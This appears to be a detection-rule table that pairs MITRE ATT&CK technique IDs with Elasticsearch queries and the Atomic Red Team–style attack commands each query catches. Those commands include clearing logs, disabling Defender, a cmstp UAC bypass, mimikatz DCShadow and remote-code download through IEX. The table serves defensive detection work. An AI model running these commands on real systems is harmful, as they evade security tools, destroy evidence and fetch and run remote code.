T1497.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"": {""CommandLine"": ""sleep""}},
                {""match_phrase"": {""CommandLine"": ""sleep.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sleep 60,2(4)
T1218.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"": {""CommandLine"": ""cmstp.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmstp.exe /s ea6e40_T1218.003.inf

cmstp.exe /s b27341_T1218.003_uacbypass.inf /au",2
T1140,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""-encode""}},
                {""match"": {""CommandLine"": ""-decode""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy %windir%\system32\certutil.exe %temp%\tcm.tmp 
&& %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt 
&& %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe

certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt 
&& certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe",2
T1112,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Set-ExecutionPolicy""}},
                {""wildcard"": {""CommandLine"": ""*Bypass""}},
                {""wildcard"": {""CommandLine"": ""*LocalMachine""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine,4
T1497.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Select-Object""}},
                        {""match"": {""CommandLine"": ""foreach""}},
                        {""wildcard"": {""CommandLine"": ""if*""}},
                        {""match"": {""CommandLine"": ""-like""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-Service""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Process""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$securityServices = @(
    ""msmpeng"",
    ""windefend"",
    ""mssense"",
    ""sense"",
    ""microsoft.tri.sensor"",
    ""microsoft.tri.sensor.updater"",
    ""cavp"",
    ""cb"",
    ""carbonblack"",
    ""carbonblackk"",
    ""cbcomms"",
    ""cbstream"",
    ""csfalconservice"",
    ""csfalconcontainer"",
    ""csagent"",
    ""csdevicecontrol"",
    ""csfalconservice"",
    ""xagt"",
    ""xagtnotif"",
    ""fe_avk"",
    ""fekern"",
    ""feelam"",
    ""fewscservice"",
    ""ekrn"",
    ""eguiproxy"",
    ""egui"",
    ""eamonm"",
    ""eelam"",
    ""ehdrv"",
    ""ekrnepfw"",
    ""epfwwfp"",
    ""ekbdflt"",
    ""epfw"",
    ""fsgk32st"",
    ""fswebuid"",
    ""fsgk32"",
    ""fsma32"",
    ""fssm32"",
    ""fnrb32"",
    ""fsaua"",
    ""fsorsp"",
    ""fsav32"",
    ""f-secure gatekeeper handler starter"",
    ""f-secure network request broker"",
    ""f-secure webui daemon"",
    ""fsma"",
    ""fsorspclie+C16nt"",
    ""f-secure gatekeeper"",
    ""f-secure hips"",
    ""fsbts"",
    ""fsni"",
    ""fsvista"",
    ""f-secure filter"",
    ""f-secure recognizer"",
    ""fses"",
    ""fsfw"",
    ""fsdfw"",
    ""fsms"",
    ""fsdevcon""
);

$currentServices = Get-Service | Select-Object -Property Name;
foreach ($svc in $currentServices) {
    foreach ($secSvc in $securityServices) {
        if ($svc.Name -like $secSvc) {
            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;
            Write-Host ""[!] Security service found:"";
            Write-Host ""    Service Name:`t"", $svcDetails.Name;
            Write-Host ""    Display Name:`t"", $svcDetails.DisplayName;
            Write-Host ""    Status:`t`t"", $svcDetails.Status;
            Write-Host """";
        }
    }
}

$forensicProcesses = @(
    ""apimonitor-x64"",
    ""apimonitor-x86"",
    ""autopsy64"",
    ""autopsy"",
    ""autoruns64"",
    ""autoruns"",
    ""autorunsc64"",
    ""autorunsc"",
    ""binaryninja"",
    ""blacklight"",
    ""cff explorer"",
    ""cutter"",
    ""de4dot"",
    ""debugview"",
    ""diskmon"",
    ""dnsd"",
    ""dnspy"",
    ""dotpeek32"",
    ""dotpeek64"",
    ""dumpcap"",
    ""evidence center"",
    ""exeinfope"",
    ""fakedns"",
    ""fakenet"",
    ""ffdec"",
    ""fiddler"",
    ""fileinsight"",
    ""floss"",
    ""gdb"",
    ""hiew32demo"",
    ""hiew32"",
    ""hollows_hunter"",
    ""idaq64"",
    ""idaq"",
    ""idr"",
    ""ildasm"",
    ""ilspy"",
    ""jd-gui"",
    ""lordpe"",
    ""officemalscanner"",
    ""ollydbg"",
    ""pdfstreamdumper"",
    ""pe-bear"",
    ""pebrowse64"",
    ""peid"",
    ""pe-sieve32"",
    ""pe-sieve64"",
    ""pestudio"",
    ""peview"",
    ""ppee"",
    ""procdump64"",
    ""procdump"",
    ""processhacker"",
    ""procexp64"",
    ""procexp"",
    ""procmon"",
    ""prodiscoverbasic"",
    ""py2exedecompiler"",
    ""r2agent"",
    ""rabin2"",
    ""radare2"",
    ""ramcapture64"",
    ""ramcapture"",
    ""reflector"",
    ""regmon"",
    ""resourcehacker"",
    ""retdec-ar-extractor"",
    ""retdec-bin2llvmir"",
    ""retdec-bin2pat"",
    ""retdec-config"",
    ""retdec-fileinfo"",
    ""retdec-getsig"",
    ""retdec-idr2pat"",
    ""retdec-llvmir2hll"",
    ""retdec-macho-extractor"",
    ""retdec-pat2yara"",
    ""retdec-stacofin"",
    ""retdec-unpacker"",
    ""retdec-yarac"",
    ""rundotnetdll"",
    ""sbiesvc"",
    ""scdbg"",
    ""scylla_x64"",
    ""scylla_x86"",
    ""shellcode_launcher"",
    ""solarwindsdiagnostics"",
    ""sysmon64"",
    ""sysmon"",
    ""task explorer"",
    ""task explorer-x64"",
    ""tcpdump"",
    ""tcpvcon"",
    ""tcpview"",
    ""vboxservice"",
    ""win32_remote"",
    ""win64_remotex64"",
    ""windbg"",
    ""windump"",
    ""winhex64"",
    ""winhex"",
    ""winobj"",
    ""wireshark"",
    ""x32dbg"",
    ""x64dbg"",
    ""xwforensics64"",
    ""xwforensics"",
    ""redcloak"",
    ""avgsvc"",
    ""avgui"",
    ""avgsvca"",
    ""avgidsagent"",
    ""avgsvcx"",
    ""avgwdsvcx"",
    ""avgadminclientservice"",
    ""afwserv"",
    ""avastui"",
    ""avastsvc"",
    ""aswidsagent"",
    ""aswidsagenta"",
    ""aswengsrv"",
    ""avastavwrapper"",
    ""bccavsvc"",
    ""psanhost"",
    ""psuaservice"",
    ""psuamain"",
    ""avp"",
    ""avpui"",
    ""ksde"",
    ""ksdeui"",
    ""tanium"",
    ""taniumclient"",
    ""taniumdetectengine"",
    ""taniumendpointindex"",
    ""taniumtracecli"",
    ""taniumtracewebsocketclient64""
);

function Find-ForensicProcesses {
    param (
        $ForensicProcessList
    );
    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;
    foreach ($proc in $CurrentProcesses) {
        foreach ($forensicProc in $ForensicProcessList) {
            if ($proc.name -like $forensicProc) {
                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;
                Write-Host ""[!] Forensic process found: "" $proc.Name;
                Write-Host ""[!] Path: "" $procPath.Path;
            }
        }
    }
}

Find-ForensicProcesses($forensicProcesses);",1
T1218.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-BuildAndInvokeInstallUtilAssembly""}},
                {""match_phrase"": {""CommandLine"": ""eaecbe_InstallUtilTestHarness.ps1""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","#caldera里该技术的8个能力都差不多，全是围绕这个脚本展开，现在没有进行深入了解
if (Test-Path ""eaecbe_InstallUtilTestHarness.ps1"") { ;
 } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; 
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""eaecbe_InstallUtilTestHarness.ps1""};  ; . eaecbe_InstallUtilTestHarness.ps1; 
$InstallerAssemblyDir = ""$Env:TEMP\""; 
$InstallerAssemblyFileName = ""T1218.004.dll""; 
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; 
$TestArgs = @{;
     OutputAssemblyDirectory = $InstallerAssemblyDir;
     OutputAssemblyFileName = $InstallerAssemblyFileName;
     InvocationMethod = 'CheckIfInstallable';
 }; 
$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; 
if ($ActualOutput -ne $ExpectedOutput) {;
     throw @"";
 CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; 
Expected: $ExpectedOutput; Actual: $ActualOutput;
 ""@; }

if (Test-Path ""eaecbe_InstallUtilTestHarness.ps1"") { ;
 } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; 
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""eaecbe_InstallUtilTestHarness.ps1""};  ; 
. eaecbe_InstallUtilTestHarness.ps1; 
$InstallerAssemblyDir = ""$Env:TEMP\""; 
$InstallerAssemblyFileName = ""T1218.004.dll""; 
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; 
$CommandLine = ""/logfile= /logtoconsole=false `""$InstallerAssemblyFullPath`""""; 
$ExpectedOutput = 'Constructor_'; 
$TestArgs = @{;
     OutputAssemblyDirectory = $InstallerAssemblyDir;
     OutputAssemblyFileName = $InstallerAssemblyFileName;
     InvocationMethod = 'InstallHelper';
     CommandLine = $CommandLine; }; 
$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; 
if ($ActualOutput -ne $ExpectedOutput) {;
     throw @""; 
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput;
 ""@;
 }

if (Test-Path ""eaecbe_InstallUtilTestHarness.ps1"") { ;
 } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null;
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""eaecbe_InstallUtilTestHarness.ps1""};  ; 
. eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = ""$Env:TEMP\""; 
$InstallerAssemblyFileName = ""T1218.004.dll""; 
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; 
$CommandLine = ""/? `""$InstallerAssemblyFullPath`"""";
$ExpectedOutput = 'Constructor_HelpText_'; 
$TestArgs = @{;
     OutputAssemblyDirectory = $InstallerAssemblyDir;
     OutputAssemblyFileName = $InstallerAssemblyFileName;
     InvocationMethod = 'Executable';
     CommandLine = $CommandLine;
 }; 
$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs;
 if ($ActualOutput -ne $ExpectedOutput) {;
     throw @"";
 InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput;
 ""@;
 }",1
T1070.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Invoke-Maldoc -macroFile""}},
                    {""match"": {""CommandLine"": ""ClearLogs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""",2(4)
T1070.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [    
                {""wildcard"": {""CommandLine"": ""wevtutil*""}},
                {""match"": {""CommandLine"": ""cl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",wevtutil cl System,2
T1070.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [    
                {""match_phrase"": {""CommandLine"": ""Clear-Eventlog""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Clear-Eventlog Security;
Clear-Eventlog System;

$logs = Get-EventLog -List | ForEach-Object {$_.Log}; 
$logs | ForEach-Object {Clear-EventLog -LogName $_ }; 
Get-EventLog -list",4
T1070.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
                       
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                {""match"": {""CommandLine"": ""–HistorySaveStyle""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-PSReadlineOption -HistorySaveStyle SaveNothing,4
T1070.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                {""match_phrase"": {""CommandLine"": ""Get-PSReadlineOption""}},
                {""wildcard"": {""CommandLine"": ""*HistorySavePath""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Remove-Item (Get-PSReadlineOption).HistorySavePath,4
T1027.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""csc.exe""}},
                 {""match_phrase"": {""CommandLine"": ""Microsoft.NET\\Framework64""}},
                {""wildcard"": {""CommandLine"": ""out*""}},
                {""wildcard"": {""CommandLine"": ""*cs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\T1027.004.exe af2f1c_calc.cs,2
T1218.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-ATHCompiledHelp""}}
                       
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                {""wildcard"": {""CommandLine"": ""hh*""}},
                {""wildcard"": {""CommandLine"": ""*chm""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",hh.exe 879ef4_T1218.001.chm,2
T1218.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""control.exe""}},
                {""wildcard"": {""CommandLine"": ""*.cpl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",control.exe 187e67_calc.cpl,3
T1564,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""net user""}},
              
                {""match"": {""CommandLine"": ""/add""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",net user $ ATOMIC123! /add /active:yes,3(特殊字符)
T1564.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""attrib*""}},
                       {""wildcard"": {""CommandLine"": ""*txt""}},
                        
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""+h""}},
                        {""match"": {""CommandLine"": ""+s""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","attrib.exe +h %temp%\T1564.001.txt

attrib.exe +s %temp%\T1564.001.txt

mkdir %temp%\T1222.001_attrib_2 >nul 2>&1 
&& echo T1222.001_attrib1 >> %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt 
&& echo T1222.001_attrib2 >> %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt 
&& attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt 
&& attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt","2
(必须实现检测“+”，目前写法es会忽略特殊字符，导致此条会误查到本文档中63号对应的攻击命令)"
T1564.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""type ""}},
                {""match"": {""CommandLine"": "">""}},
                {""match"": {""CommandLine"": "":""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {;
     New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki;
     }; 
Start-Process -FilePath ""$env:comspec"" -ArgumentList ""/c,type,#{payload_path},>,`""#{ads_file_path}:#{ads_name}`""""",2
T1564.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""set-content""}},
                {""match_phrase"": {""CommandLine"": ""-stream""}},
                {""match_phrase"": {""CommandLine"": ""-value""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""test"" > $env:TEMP\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value ""test""; 
set-content -path $env:TEMP\T1564.004_has_ads_powershell.txt -stream adstest.txt -value ""test2""; 
set-content -path . -stream adstest.txt -value ""test3""",2
T1564.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Microsoft-Hyper""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""New-VM""}},
                        {""match_phrase"": {""CommandLine"": ""Set-VMFirmware""}},
                        {""match_phrase"": {""CommandLine"": ""Start-VM""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}
","if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ;
 } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;
 $VM = ""Atomic VM""; 
New-VM -Name $VM -Generation 2; 
Set-VMFirmware $VM -EnableSecureBoot Off; 
Start-VM $VM",2
T1564.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""VBoxManage*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""term"": {""CommandLine"": ""createvm""}},
                        {""term"": {""CommandLine"": ""modifyvm""}},
                        {""term"": {""CommandLine"": ""startvm""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}
","""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" createvm --name ""Atomic VM"" --register 
&& ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" modifyvm ""Atomic VM"" --firmware efi 
&& ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" startvm ""Atomic VM""",2
T1564.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""sc create""}},
                {""match"": {""CommandLine"": ""VboxDrv.sys""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","""C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe"" /reregserver 
&& regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll"" 
&& rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"" 
&& sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV 
&& sc start VBoxDRV",2(5)
T1036.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""win32time*""}},
                        {""match"": {""CommandLine"":{ 
                                           ""query"": ""win32time"",
                                           ""fuzziness"": ""AUTO""}
                                       }
                       }
                    ]
     }
    },
    {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""win32time""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""sc create""}},
                        {""match_phrase"": {""CommandLine"": ""sc qc""}},
                        {""match_phrase"": {""CommandLine"": ""schtasks /create""}},
                        {""match_phrase"": {""CommandLine"": ""schtasks /query""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1"" 
&& sc qc win32times

schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f 
&& schtasks /query /tn win32times",2
T1207,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""lsadump::dcshadow""}},
                        {""wildcard"": {""CommandLine"": ""mimikatz*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                        {""match_phrase"": {""CommandLine"": ""Wait-Process""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$dc_output_file = ""$env:TEMP\art-T1207-mimikatz-DC.log""; 
Remove-Item $dc_output_file -ErrorAction Ignore; 
$mimikatzParam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`""""; 
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList ""/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam""; 
Start-Sleep -Seconds 5; &; 
Write-Host ""`nWaiting for fake DC server to return""; 
Wait-Process $dc; 
Write-Host ""`nOutput from fake DC server:""; 
Get-Content $dc_output_file; 
Start-Sleep 1; 
Remove-Item $dc_output_file -ErrorAction Ignore; 
Write-Host ""End of DCShadow""",(2)4
T1070.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""Win32_Process*""}},
                {""match_phrase"": {""CommandLine"": ""Get-CimClass""}},
                {""match_phrase"": {""CommandLine"": ""New-CimInstance""}},
                {""match_phrase"": {""CommandLine"": ""del /f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;
$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;
$processClass = Get-CimClass -ClassName Win32_Process;
Invoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{
    Commandline = 'cmd.exe /c ""timeout /nobreak /t 10 >nul 2>nul & del /f #{location}""';
    ProcessStartupInformation = [CimInstance]$startupInfo
};",(2)4
T1070.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                {""match"": {""CommandLine"": ""prefetch""}},
                {""wildcard"": {""CommandLine"": ""*pf""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])",2(4)
T1070.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""history""}},
                        {""match"": {""CommandLine"": ""prefetch""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                       {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                       {""match_phrase"": {""CommandLine"": ""del /f""}},
                       {""match_phrase"": {""CommandLine"": ""rmdir /s""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\TeamViewer_54.log

Remove-Item -path $env:TEMP\deleteme_T1551.004

del /f %temp%\deleteme_T1551.004

Remove-Item -Path $env:TEMP\deleteme_folder_T1551.004 -Recurse

rmdir /s /q %temp%\deleteme_T1551.004

Remove-Item -Force -Path ""#{payload}""",2
T1070.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""reg add""}},
                {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\LanmanServer\\Parameters""}},
                {""wildcard"": {""CommandLine"": ""AutoShare*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f 
&& reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""net*""}},
                        {""wildcard"": {""CommandLine"": ""sc*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""McAfee*""}},
                        {""wildcard"": {""CommandLine"": ""360sd*""}},
                        {""wildcard"": {""CommandLine"": ""hipstray*""}},
                        {""wildcard"": {""CommandLine"": ""WinDefend*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""stop""}},
                        {""match_phrase"": {""CommandLine"": ""start=disabled""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net.exe stop McAfeeDLPAgentService 
&& sc.exe config McAfeeDLPAgentService start= disabled

sc stop WinDefend 
&& sc config WinDefend start=disabled 
&& sc query WinDefend",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Add-MpPreference""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""-ExclusionPath""}},
                        {""match"": {""CommandLine"": ""-ExclusionProcess""}},
                        {""match"": {""CommandLine"": ""-ExclusionExtension""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$excludedExts= "".exe""; 
Add-MpPreference -ExclusionExtension  $excludedExts

$excludedpath= ""C:\Temp""; 
Add-MpPreference -ExclusionPath $excludedpath

$excludedProcess = ""outlook.exe""; 
Add-MpPreference -ExclusionProcess $excludedProcess",2(4)
